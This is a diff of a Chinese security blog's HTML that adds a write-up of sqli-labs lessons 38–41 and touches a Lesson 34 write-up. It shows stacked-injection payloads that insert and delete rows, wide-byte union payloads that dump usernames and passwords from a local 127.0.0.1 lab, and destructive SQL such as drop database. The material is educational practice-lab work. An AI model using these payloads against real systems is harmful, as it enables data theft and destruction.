@@ -64,9 +64,9 @@
       <div class="outer">
         <section id="main">
   
-    <article id="post-sql-labs-Less-38" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-sql-labs-Less-38~41" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2021/02/21/sql-labs-Less-38/" class="article-date">
+    <a href="/2021/02/21/sql-labs-Less-38~41/" class="article-date">
   <time datetime="2021-02-21T08:56:28.000Z" itemprop="datePublished">2021-02-21</time>
 </a>
     
@@ -78,7 +78,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2021/02/21/sql-labs-Less-38/">sql-labs-Less-38</a>
+      <a class="article-title" href="/2021/02/21/sql-labs-Less-38~41/">sql-labs-Less-38~41</a>
     </h1>
   
 
@@ -86,11 +86,30 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        
+        <h1>Less-38</h1>
+
+<p>进入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-38/,%E8%BE%93%E5%85%A5?id=1,%E6%AD%A3%E5%B8%B8%EF%BC%8C%E5%9C%A8%E8%BE%93%E5%85%A5&#39;%EF%BC%8C%E5%8F%91%E7%94%9F%E6%8A%A5%E9%94%99%EF%BC%8C%E4%BB%8E%E5%9B%9E%E6%98%BE%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%87%BA%E7%94%A8&#39;%E6%B3%A8%E5%85%A5%EF%BC%8C%E5%9C%A8%E8%BE%93%E5%85%A5--+%EF%BC%8C%E6%AD%A3%E5%B8%B8%E3%80%82">http://127.0.0.1/sql/Less-38/,输入?id=1,正常，在输入&#39;，发生报错，从回显可以看出用&#39;注入，在输入--+，正常。</a><br>接下来的步骤和Less-1的差不多。<br>堆叠注入：<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-38/?id=1&#39;;insert">http://127.0.0.1/sql/Less-38/?id=1&#39;;insert</a> into users(id,username,password) values (‘66’,’6666’,’6666’)–+<br>在数据库中新建一个数据：</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/21/sql-labs-Less-38~41/1.png" alt="1"><br>可以看到在库中有了一个新数据。<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-38/?id=1&#39;;delete">http://127.0.0.1/sql/Less-38/?id=1&#39;;delete</a> from users where id=’66’–+<br>看到刚才加的数据没了。</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/21/sql-labs-Less-38~41/2.png" alt="2"></p>
+<h1>Less-39</h1>
+
+<p>和Less-38一样，只是变成了整型注入。</p>
+<h1>Less-40</h1>
+
+<p>和Less-38一样，只是注入字符是’)。</p>
+<h1>Less-41</h1>
+
+<p>和Less-39一样，只是没有报错信息。</p>
+<h1>小结</h1>
+
+<p>1.堆叠注入<br>  注入时，用‘;’把多个语句分开，这样注入时就可以同时运行多个语句。和union操作符不同的是，union使用的语句类型是有限的。<br>详细：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/lcamry/p/5762905.html">https://www.cnblogs.com/lcamry/p/5762905.html</a></p>
+<p>2.增删查改语句</p>
+<p>1)增：insert into 表名（例1，例2，…….）values (v1,v2,…….);<br>    // insert into student(id,name,grade) values (1,’zhangshan’,98);<br>2)删：<br>删数据:<br>delete from 表名;<br>delete from 表名 where id=1;<br>    //delete from users where id=1;<br>删数据库：drop database 数据库名;<br>删除表：drop table 表名;<br>删除表中的列:alter table 表名 drop column 列名;<br>3)改：update 表名 set 字段=‘值’【where 条件】；<br>    // update users set username= ‘ABC’ where id=’1’;<br>4)查：select */字段列表 from 表名 【where 条件】;<br>    // select */username from users 【where id=’1’】; </p>
+
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/02/21/sql-labs-Less-38/" data-id="cklex3w1e00000guxalqkdupg" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2021/02/21/sql-labs-Less-38~41/" data-id="cklf0ujcp0000ykux4413e9ev" class="article-share-link">Share</a>
       
       
     </footer>
@@ -133,6 +152,7 @@
 
 <h1>小结</h1>
 mysql_real_escape_string()函数详细：https://www.w3school.com.cn/php/func_mysql_real_escape_string.asp
+（less-17也有）
 
 
 
@@ -176,7 +196,7 @@ mysql_real_escape_string()函数详细：https://www.w3school.com.cn/php/func_my
         <p>方法一：<br>进入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-34/%EF%BC%8C%E6%89%93%E5%BC%80http">http://127.0.0.1/sql/Less-34/，打开http</a> header live,输入admin：admin登录；<br>打开最上面的那一个:</p>
 <p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/20/sql-labs-Less-34/1.png" alt="1"><br>从源代码可以看到umane和passwd都被套上了addslashes函数，所以我们可以用宽字节注入。<br>因为在页面直接注入会被url转码，所以我们在http header live进行注入。</p>
 <p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/20/sql-labs-Less-34/2.png" alt="2"><br>然后跳出一个新页面。</p>
-<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/20/sql-labs-Less-34/3.png" alt="3"><br>判断字符：<br>第一步：uname=admin%df’&amp;passwd=admin&amp;submit=Submit（报错）<br>第二步：uname=admin%df’#&amp;passwd=admin&amp;submit=Submit（不报错）<br>查列数：uname=admin%df’ order by 2#&amp;passwd=admin&amp;submit=Submit<br>测位置：uname=admin%df’ union select 1,2#&amp;passwd=admin&amp;submit=Submit<br>爆库：uname=admin%df’ union select database(),2#&amp;passwd=admin&amp;submit=Submit<br>爆表：uname=admin%df’ union select (select group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479),2#&amp;passwd=admin&amp;submit=Submit<br>爆列：uname=admin%df’ union select (select group_concat(column_name) from information_schema.columns where table_name=0x7573657273),2#&amp;passwd=admin&amp;submit=Submit<br>爆字段：uname=admin%df’ union select (select group_concat(username) from users),(select group_concat(password) from users)#&amp;passwd=admin&amp;submit=Submit</p>
+<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/20/sql-labs-Less-34/3.png" alt="3"><br>判断字符：<br>第一步：uname=admin%df’&amp;passwd=admin&amp;submit=Submit（报错）<br>第二步：uname=admin%df’#&amp;passwd=admin&amp;submit=Submit（不报错）<br>查列数：uname=admin%df’ order by 2#&amp;passwd=admin&amp;submit=Submit<br>测位置：uname=aadmin%df’ union select 1,2#&amp;passwd=admin&amp;submit=Submit<br>爆库：uname=aadmin%df’ union select database(),2#&amp;passwd=admin&amp;submit=Submit<br>爆表：uname=aadmin%df’ union select (select group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479),2#&amp;passwd=admin&amp;submit=Submit<br>爆列：uname=aadmin%df’ union select (select group_concat(column_name) from information_schema.columns where table_name=0x7573657273),2#&amp;passwd=admin&amp;submit=Submit<br>爆字段：uname=aadmin%df’ union select (select group_concat(username) from users),(select group_concat(password) from users)#&amp;passwd=admin&amp;submit=Submit</p>
 <p>方法二：<br>将utf-8转换为utf-16或utf-32，例如将’转为utf-16的�’。接下来都是在username改，password不管随便输。<br>判断字符：�’（报错）�’#（不报错）<br>列数：�’ order by 2#<br>测位置：�’union select 1,2#<br>爆库：�’union select database(),2#<br>爆表：�’union select (select group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479),2#<br>爆列：�’union select (select group_concat(column_name) from information_schema.columns where table_name=0x7573657273),2#<br>爆字段：�’union select (select group_concat(username) from users),(select group_concat(password) from users)#</p>
 
       
@@ -520,7 +540,7 @@ https://www.cnblogs.com/lcamry/p/5762961.html
       <ul>
         
           <li>
-            <a href="/2021/02/21/sql-labs-Less-38/">sql-labs-Less-38</a>
+            <a href="/2021/02/21/sql-labs-Less-38~41/">sql-labs-Less-38~41</a>
           </li>
         
           <li>
